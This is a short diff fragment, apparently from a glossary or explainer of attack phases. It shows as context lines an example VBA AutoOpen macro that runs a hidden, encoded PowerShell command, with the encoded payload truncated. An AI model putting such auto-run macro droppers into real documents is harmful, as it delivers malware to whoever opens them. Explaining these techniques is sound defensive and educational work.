@@ -52,3 +52,4 @@ Phase where the attacker activates their malicious code after infiltrating the s
    Sub AutoOpen()
        Shell "cmd /c powershell -nop -w hidden -e JABzAD0A..."
    End Sub
+
